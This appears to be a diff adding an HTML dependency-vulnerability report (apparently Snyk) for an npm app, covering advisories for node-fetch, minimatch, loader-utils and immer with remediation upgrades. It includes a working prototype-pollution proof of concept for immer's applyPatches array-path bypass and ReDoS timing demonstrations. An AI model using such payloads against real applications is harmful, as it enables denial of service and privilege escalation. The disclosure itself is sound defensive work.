+            <h2 class="card__title">Denial of Service</h2>
+            <div class="card__section">
+        
+                <div class="label label--medium">
+                    <span class="label__text">medium severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            node-fetch
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    my-app@0.1.0, mdbreact@5.2.0 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        mdbreact@5.2.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        @material-ui/core@3.9.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        recompose@0.30.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        fbjs@0.8.18
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        isomorphic-fetch@2.2.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        node-fetch@1.7.3
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://www.npmjs.com/package/node-fetch">node-fetch</a> is a light-weight module that brings window.fetch to node.js
+        Affected versions of this package are vulnerable to Denial of Service. Node Fetch did not honor the <code>size</code> option after following a redirect, which means that when a content size was over the limit, a FetchError would never get thrown and the process would end without failure.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>node-fetch</code> to version 2.6.1, 3.0.0-beta.9 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/node-fetch/node-fetch/security/advisories/GHSA-w7rc-rwvf-8q5r">GitHub Advisory</a></li>
+        <li><a href="https://github.com/node-fetch/node-fetch/commit/2358a6c2563d1730a0cdaccc197c611949f6a334">GitHub Commit</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-NODEFETCH-674311">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--medium" data-snyk-test="medium">
+            <h2 class="card__title">Regular Expression Denial of Service (ReDoS)</h2>
+            <div class="card__section">
+        
+                <div class="label label--medium">
+                    <span class="label__text">medium severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            minimatch
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    my-app@0.1.0, react-scripts@4.0.3 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-scripts@4.0.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-dev-utils@11.0.4
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        recursive-readdir@2.2.2
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        minimatch@3.0.4
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://www.npmjs.com/package/minimatch">minimatch</a> is a minimal matching utility.
+        Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the <code>braceExpand</code> function in <code>minimatch.js</code>.</p>
+        <h2 id="details">Details</h2>
+        <p>Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.</p>
+        <p>The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren&#39;t very intuitive and can ultimately end up making it easy for attackers to take your site down.</p>
+        <p>Let’s take the following regular expression as an example:</p>
+        <pre><code class="language-js">regex = /A(B|C+)+D/
+        </code></pre>
+        <p>This regular expression accomplishes the following:</p>
+        <ul>
+        <li><code>A</code> The string must start with the letter &#39;A&#39;</li>
+        <li><code>(B|C+)+</code> The string must then follow the letter A with either the letter &#39;B&#39; or some number of occurrences of the letter &#39;C&#39; (the <code>+</code> matches one or more times). The <code>+</code> at the end of this section states that we can look for one or more matches of this section.</li>
+        <li><code>D</code> Finally, we ensure this section of the string ends with a &#39;D&#39;</li>
+        </ul>
+        <p>The expression would match inputs such as <code>ABBD</code>, <code>ABCCCCD</code>, <code>ABCBCCCD</code> and <code>ACCCCCD</code></p>
+        <p>It most cases, it doesn&#39;t take very long for a regex engine to find a match:</p>
+        <pre><code class="language-bash">$ time node -e &#39;/A(B|C+)+D/.test(&quot;ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD&quot;)&#39;
+        0.04s user 0.01s system 95% cpu 0.052 total
+        
+        $ time node -e &#39;/A(B|C+)+D/.test(&quot;ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX&quot;)&#39;
+        1.79s user 0.02s system 99% cpu 1.812 total
+        </code></pre>
+        <p>The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.</p>
+        <p>Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as <em>catastrophic backtracking</em>.</p>
+        <p>Let&#39;s look at how our expression runs into this problem, using a shorter string: &quot;ACCCX&quot;. While it seems fairly straightforward, there are still four different ways that the engine could match those three C&#39;s:</p>
+        <ol>
+        <li>CCC</li>
+        <li>CC+C</li>
+        <li>C+CC</li>
+        <li>C+C+C.</li>
+        </ol>
+        <p>The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use <a href="https://regex101.com/debugger">RegEx 101 debugger</a> to see the engine has to take a total of 38 steps before it can determine the string doesn&#39;t match.</p>
+        <p>From there, the number of steps the engine must use to validate a string just continues to grow.</p>
+        <table>
+        <thead>
+        <tr>
+        <th>String</th>
+        <th align="right">Number of C&#39;s</th>
+        <th align="right">Number of steps</th>
+        </tr>
+        </thead>
+        <tbody><tr>
+        <td>ACCCX</td>
+        <td align="right">3</td>
+        <td align="right">38</td>
+        </tr>
+        <tr>
+        <td>ACCCCX</td>
+        <td align="right">4</td>
+        <td align="right">71</td>
+        </tr>
+        <tr>
+        <td>ACCCCCX</td>
+        <td align="right">5</td>
+        <td align="right">136</td>
+        </tr>
+        <tr>
+        <td>ACCCCCCCCCCCCCCX</td>
+        <td align="right">14</td>
+        <td align="right">65,553</td>
+        </tr>
+        </tbody></table>
+        <p>By the time the string includes 14 C&#39;s, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>minimatch</code> to version 3.0.5 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/isaacs/minimatch/commit/a8763f4388e51956be62dc6025cec1126beeb5e6">GitHub Commit</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-MINIMATCH-3050818">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--medium" data-snyk-test="medium">
+            <h2 class="card__title">Regular Expression Denial of Service (ReDoS)</h2>
+            <div class="card__section">
+        
+                <div class="label label--medium">
+                    <span class="label__text">medium severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            loader-utils
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    my-app@0.1.0, react-scripts@4.0.3 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-scripts@4.0.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-dev-utils@11.0.4
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        loader-utils@2.0.0
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p>Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the <code>resourcePath</code> variable in <code>interpolateName.js</code>.</p>
+        <h2 id="details">Details</h2>
+        <p>Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.</p>
+        <p>The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren&#39;t very intuitive and can ultimately end up making it easy for attackers to take your site down.</p>
+        <p>Let’s take the following regular expression as an example:</p>
+        <pre><code class="language-js">regex = /A(B|C+)+D/
+        </code></pre>
+        <p>This regular expression accomplishes the following:</p>
+        <ul>
+        <li><code>A</code> The string must start with the letter &#39;A&#39;</li>
+        <li><code>(B|C+)+</code> The string must then follow the letter A with either the letter &#39;B&#39; or some number of occurrences of the letter &#39;C&#39; (the <code>+</code> matches one or more times). The <code>+</code> at the end of this section states that we can look for one or more matches of this section.</li>
+        <li><code>D</code> Finally, we ensure this section of the string ends with a &#39;D&#39;</li>
+        </ul>
+        <p>The expression would match inputs such as <code>ABBD</code>, <code>ABCCCCD</code>, <code>ABCBCCCD</code> and <code>ACCCCCD</code></p>
+        <p>It most cases, it doesn&#39;t take very long for a regex engine to find a match:</p>
+        <pre><code class="language-bash">$ time node -e &#39;/A(B|C+)+D/.test(&quot;ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD&quot;)&#39;
+        0.04s user 0.01s system 95% cpu 0.052 total
+        
+        $ time node -e &#39;/A(B|C+)+D/.test(&quot;ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX&quot;)&#39;
+        1.79s user 0.02s system 99% cpu 1.812 total
+        </code></pre>
+        <p>The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.</p>
+        <p>Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as <em>catastrophic backtracking</em>.</p>
+        <p>Let&#39;s look at how our expression runs into this problem, using a shorter string: &quot;ACCCX&quot;. While it seems fairly straightforward, there are still four different ways that the engine could match those three C&#39;s:</p>
+        <ol>
+        <li>CCC</li>
+        <li>CC+C</li>
+        <li>C+CC</li>
+        <li>C+C+C.</li>
+        </ol>
+        <p>The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use <a href="https://regex101.com/debugger">RegEx 101 debugger</a> to see the engine has to take a total of 38 steps before it can determine the string doesn&#39;t match.</p>
+        <p>From there, the number of steps the engine must use to validate a string just continues to grow.</p>
+        <table>
+        <thead>
+        <tr>
+        <th>String</th>
+        <th align="right">Number of C&#39;s</th>
+        <th align="right">Number of steps</th>
+        </tr>
+        </thead>
+        <tbody><tr>
+        <td>ACCCX</td>
+        <td align="right">3</td>
+        <td align="right">38</td>
+        </tr>
+        <tr>
+        <td>ACCCCX</td>
+        <td align="right">4</td>
+        <td align="right">71</td>
+        </tr>
+        <tr>
+        <td>ACCCCCX</td>
+        <td align="right">5</td>
+        <td align="right">136</td>
+        </tr>
+        <tr>
+        <td>ACCCCCCCCCCCCCCX</td>
+        <td align="right">14</td>
+        <td align="right">65,553</td>
+        </tr>
+        </tbody></table>
+        <p>By the time the string includes 14 C&#39;s, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>loader-utils</code> to version 1.4.2, 2.0.4, 3.2.1 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/webpack/loader-utils/pull/225/commits/d4d4c0fb9cf1766a02b833ac4ac50b2164c52d73">GItHub Commit</a></li>
+        <li><a href="https://github.com/webpack/loader-utils/issues/211">GitHub Issue</a></li>
+        <li><a href="https://github.com/webpack/loader-utils/issues/216">GitHub Issue</a></li>
+        <li><a href="https://github.com/webpack/loader-utils/pull/225">GitHub PR</a></li>
+        <li><a href="https://github.com/webpack/loader-utils/blob/d9f4e23cf411d8556f8bac2d3bf05a6e0103b568/lib/interpolateName.js#L38">Vulnerable Code</a></li>
+        <li><a href="https://github.com/webpack/loader-utils/blob/d9f4e23cf411d8556f8bac2d3bf05a6e0103b568/lib/interpolateName.js#L83">Vulnerable Code</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-LOADERUTILS-3042992">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--medium" data-snyk-test="medium">
+            <h2 class="card__title">Regular Expression Denial of Service (ReDoS)</h2>
+            <div class="card__section">
+        
+                <div class="label label--medium">
+                    <span class="label__text">medium severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            loader-utils
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    my-app@0.1.0, react-scripts@4.0.3 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-scripts@4.0.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-dev-utils@11.0.4
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        loader-utils@2.0.0
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p>Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in <code>interpolateName</code> function via the <code>URL</code> variable.</p>
+        <h2 id="details">Details</h2>
+        <p>Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.</p>
+        <p>The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren&#39;t very intuitive and can ultimately end up making it easy for attackers to take your site down.</p>
+        <p>Let’s take the following regular expression as an example:</p>
+        <pre><code class="language-js">regex = /A(B|C+)+D/
+        </code></pre>
+        <p>This regular expression accomplishes the following:</p>
+        <ul>
+        <li><code>A</code> The string must start with the letter &#39;A&#39;</li>
+        <li><code>(B|C+)+</code> The string must then follow the letter A with either the letter &#39;B&#39; or some number of occurrences of the letter &#39;C&#39; (the <code>+</code> matches one or more times). The <code>+</code> at the end of this section states that we can look for one or more matches of this section.</li>
+        <li><code>D</code> Finally, we ensure this section of the string ends with a &#39;D&#39;</li>
+        </ul>
+        <p>The expression would match inputs such as <code>ABBD</code>, <code>ABCCCCD</code>, <code>ABCBCCCD</code> and <code>ACCCCCD</code></p>
+        <p>It most cases, it doesn&#39;t take very long for a regex engine to find a match:</p>
+        <pre><code class="language-bash">$ time node -e &#39;/A(B|C+)+D/.test(&quot;ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD&quot;)&#39;
+        0.04s user 0.01s system 95% cpu 0.052 total
+        
+        $ time node -e &#39;/A(B|C+)+D/.test(&quot;ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX&quot;)&#39;
+        1.79s user 0.02s system 99% cpu 1.812 total
+        </code></pre>
+        <p>The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.</p>
+        <p>Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as <em>catastrophic backtracking</em>.</p>
+        <p>Let&#39;s look at how our expression runs into this problem, using a shorter string: &quot;ACCCX&quot;. While it seems fairly straightforward, there are still four different ways that the engine could match those three C&#39;s:</p>
+        <ol>
+        <li>CCC</li>
+        <li>CC+C</li>
+        <li>C+CC</li>
+        <li>C+C+C.</li>
+        </ol>
+        <p>The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use <a href="https://regex101.com/debugger">RegEx 101 debugger</a> to see the engine has to take a total of 38 steps before it can determine the string doesn&#39;t match.</p>
+        <p>From there, the number of steps the engine must use to validate a string just continues to grow.</p>
+        <table>
+        <thead>
+        <tr>
+        <th>String</th>
+        <th align="right">Number of C&#39;s</th>
+        <th align="right">Number of steps</th>
+        </tr>
+        </thead>
+        <tbody><tr>
+        <td>ACCCX</td>
+        <td align="right">3</td>
+        <td align="right">38</td>
+        </tr>
+        <tr>
+        <td>ACCCCX</td>
+        <td align="right">4</td>
+        <td align="right">71</td>
+        </tr>
+        <tr>
+        <td>ACCCCCX</td>
+        <td align="right">5</td>
+        <td align="right">136</td>
+        </tr>
+        <tr>
+        <td>ACCCCCCCCCCCCCCX</td>
+        <td align="right">14</td>
+        <td align="right">65,553</td>
+        </tr>
+        </tbody></table>
+        <p>By the time the string includes 14 C&#39;s, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>loader-utils</code> to version 1.4.2, 2.0.4, 3.2.1 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/webpack/loader-utils/commit/d2d752d59629daee38f34b24307221349c490eb1">GitHub Commit</a></li>
+        <li><a href="https://github.com/webpack/loader-utils/pull/225/commits/d4d4c0fb9cf1766a02b833ac4ac50b2164c52d73">GitHub Commit</a></li>
+        <li><a href="https://github.com/webpack/loader-utils/issues/213">GitHub Issue</a></li>
+        <li><a href="https://github.com/webpack/loader-utils/issues/216">GitHub Issue</a></li>
+        <li><a href="https://github.com/webpack/loader-utils/pull/224">GitHub PR</a></li>
+        <li><a href="https://github.com/webpack/loader-utils/releases/tag/v1.4.2">GitHub Release</a></li>
+        <li><a href="https://github.com/webpack/loader-utils/releases/tag/v2.0.4">GitHub Release</a></li>
+        <li><a href="https://github.com/webpack/loader-utils/releases/tag/v3.2.1">GitHub Release</a></li>
+        <li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2140597">RedHat Bugzilla Bug</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-LOADERUTILS-3105943">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--medium" data-snyk-test="medium">
+            <h2 class="card__title">Prototype Pollution</h2>
+            <div class="card__section">
+        
+                <div class="label label--medium">
+                    <span class="label__text">medium severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            immer
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    my-app@0.1.0, react-scripts@4.0.3 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-scripts@4.0.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-dev-utils@11.0.4
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        immer@8.0.1
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://www.npmjs.com/package/immer">immer</a> is a package that allows you to create your next immutable state by mutating the current one.
+        Affected versions of this package are vulnerable to Prototype Pollution. A type confusion vulnerability can lead to a bypass of CVE-2020-28477 when the user-provided keys used in the <code>path</code> parameter are arrays. In particular, this bypass is possible because the condition <code>(p === &quot;__proto__&quot; || p === &quot;constructor&quot;)</code> in <code>applyPatches_</code> returns <code>false</code> if <code>p</code> is <code>[&#39;__proto__&#39;]</code> (or <code>[&#39;constructor&#39;]</code>). The <code>===</code> operator (strict equality operator) returns <code>false</code> if the operands have different type.</p>
+        <h3 id="poc">PoC</h3>
+        <pre><code>const {applyPatches, enablePatches} = require(&quot;immer&quot;);
+        enablePatches();
+        
+        // applyPatches({}, [ { op: &#39;add&#39;, path: [ &quot;__proto__&quot;, &quot;polluted&quot; ], value: &quot;yes&quot; } ]);
+        // applyPatches({}, [ { op: &#39;replace&#39;, path: [ &quot;__proto__&quot;, &quot;polluted&quot; ], value: &quot;yes&quot; } ]);
+        // console.log(polluted); // Error: [Immer] Patching reserved attributes like __proto__, prototype and constructor is not allowed
+        
+        applyPatches({}, [ { op: &#39;add&#39;, path: [[&#39;__proto__&#39;], &#39;polluted&#39;], value: &#39;yes&#39; } ]);
+        // applyPatches({}, [ { op: &#39;replace&#39;, path: [[&#39;__proto__&#39;], &#39;polluted&#39;], value: &#39;yes&#39; } ]);
+        console.log(polluted);
+        </code></pre>
+        <h2 id="details">Details</h2>
+        <p>Prototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as <code>__proto__</code>, <code>constructor</code> and <code>prototype</code>. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the <code>Object.prototype</code> are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.</p>
+        <p>There are two main ways in which the pollution of prototypes occurs:</p>
+        <ul>
+        <li><p>Unsafe <code>Object</code> recursive merge</p>
+        </li>
+        <li><p>Property definition by path</p>
+        </li>
+        </ul>
+        <h3 id="unsafe-object-recursive-merge">Unsafe Object recursive merge</h3>
+        <p>The logic of a vulnerable recursive merge function follows the following high-level model:</p>
+        <pre><code>merge (target, source)
+        
+          foreach property of source
+        
+            if property exists and is an object on both the target and the source
+        
+              merge(target[property], source[property])
+        
+            else
+        
+              target[property] = source[property]
+        </code></pre>
+        <br>  
+        
+        <p>When the source object contains a property named <code>__proto__</code> defined with <code>Object.defineProperty()</code> , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of <code>Object</code> and the source of <code>Object</code> as defined by the attacker. Properties are then copied on the <code>Object</code> prototype.</p>
+        <p>Clone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: <code>merge({},source)</code>.</p>
+        <p><code>lodash</code> and <code>Hoek</code> are examples of libraries susceptible to recursive merge attacks.</p>
+        <h3 id="property-definition-by-path">Property definition by path</h3>
+        <p>There are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: <code>theFunction(object, path, value)</code></p>
+        <p>If the attacker can control the value of “path”, they can set this value to <code>__proto__.myValue</code>. <code>myValue</code> is then assigned to the prototype of the class of the object.</p>
+        <h2 id="types-of-attacks">Types of attacks</h2>
+        <p>There are a few methods by which Prototype Pollution can be manipulated:</p>
+        <table>
+        <thead>
+        <tr>
+        <th>Type</th>
+        <th>Origin</th>
+        <th>Short description</th>
+        </tr>
+        </thead>
+        <tbody><tr>
+        <td><strong>Denial of service (DoS)</strong></td>
+        <td>Client</td>
+        <td>This is the most likely attack. <br>DoS occurs when <code>Object</code> holds generic functions that are implicitly called for various operations (for example, <code>toString</code> and <code>valueOf</code>). <br> The attacker pollutes <code>Object.prototype.someattr</code> and alters its state to an unexpected value such as <code>Int</code> or <code>Object</code>. In this case, the code fails and is likely to cause a denial of service.  <br><strong>For example:</strong> if an attacker pollutes <code>Object.prototype.toString</code> by defining it as an integer, if the codebase at any point was reliant on <code>someobject.toString()</code> it would fail.</td>
+        </tr>
+        <tr>
+        <td><strong>Remote Code Execution</strong></td>
+        <td>Client</td>
+        <td>Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br><strong>For example:</strong> <code>eval(someobject.someattr)</code>. In this case, if the attacker pollutes <code>Object.prototype.someattr</code> they are likely to be able to leverage this in order to execute code.</td>
+        </tr>
+        <tr>
+        <td><strong>Property Injection</strong></td>
+        <td>Client</td>
+        <td>The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  <strong>For example:</strong> if a codebase checks privileges for <code>someuser.isAdmin</code>, then when the attacker pollutes <code>Object.prototype.isAdmin</code> and sets it to equal <code>true</code>, they can then achieve admin privileges.</td>
+        </tr>
+        </tbody></table>
+        <h2 id="affected-environments">Affected environments</h2>
+        <p>The following environments are susceptible to a Prototype Pollution attack:</p>
+        <ul>
+        <li><p>Application server</p>
+        </li>
+        <li><p>Web server</p>
+        </li>
+        <li><p>Web browser</p>
+        </li>
+        </ul>
+        <h2 id="how-to-prevent">How to prevent</h2>
+        <ol>
+        <li><p>Freeze the prototype— use <code>Object.freeze (Object.prototype)</code>.</p>
+        </li>
+        <li><p>Require schema validation of JSON input.</p>
+        </li>
+        <li><p>Avoid using unsafe recursive merge functions.</p>
+        </li>
+        <li><p>Consider using objects without prototypes (for example, <code>Object.create(null)</code>), breaking the prototype chain and preventing pollution.</p>
+        </li>
+        <li><p>As a best practice use <code>Map</code> instead of <code>Object</code>.</p>
+        </li>
+        </ol>
+        <h3 id="for-more-information-on-this-vulnerability-type">For more information on this vulnerability type:</h3>
+        <p><a href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf">Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018</a></p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>immer</code> to version 9.0.6 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/immerjs/immer/commit/fa671e55ee9bd42ae08cc239102b665a23958237">GitHub Commit</a></li>
+        <li><a href="https://snyk.io/blog/remediate-javascript-type-confusion-bypassed-input-validation/">Snyk Blog</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-IMMER-1540542">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--medium" data-snyk-test="medium">
+            <h2 class="card__title">Regular Expression Denial of Service (ReDoS)</h2>
+            <div class="card__section">
+        
+                <div class="label label--medium">
+                    <span class="label__text">medium severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            glob-parent
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    my-app@0.1.0, react-scripts@4.0.3 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
